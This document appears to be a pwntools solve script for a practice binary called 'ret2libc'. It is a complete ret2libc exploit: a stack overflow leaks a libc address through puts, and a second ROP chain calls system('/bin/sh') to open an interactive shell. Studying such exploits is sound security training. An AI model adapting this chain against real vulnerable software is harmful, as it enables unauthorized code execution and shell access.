#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'

e = ELF('./ret2libc')
l = ELF('./libc.so.6')
r = process(('./ret2libc'))
pause()
libc_start_main_got = 0x600ff0

gets_plt = 0x400530
puts_plt = 0x400520
main = 0x400698

pop_rdi = 0x0000000000400733
ret = 0x0000000000400506

system_offset = 0x4f550

p = flat(
    b'A' * 56,
    pop_rdi,
    libc_start_main_got,
    puts_plt,
    main
)

r.sendlineafter(':D', p)

r.recvline()
libc_start_main_so = 0x21b10
libc = u64(r.recv(6) + b'\0\0') - libc_start_main_so
success('libc -> %s' % hex(libc))
# 0x7ffff7b95e1a
system_ptr = libc + system_offset
bin_sh_offset = hex(next(l.search(b'/bin/sh')))
info('"/bin/sh" -> %s' % bin_sh_offset)
bin_sh_offset = 0x1b3e1a + libc
p = flat(
    b'A' * 56,
    ret,
    pop_rdi,
    bin_sh_offset,
    system_ptr
)
r.sendlineafter(':D', p)
r.interactive()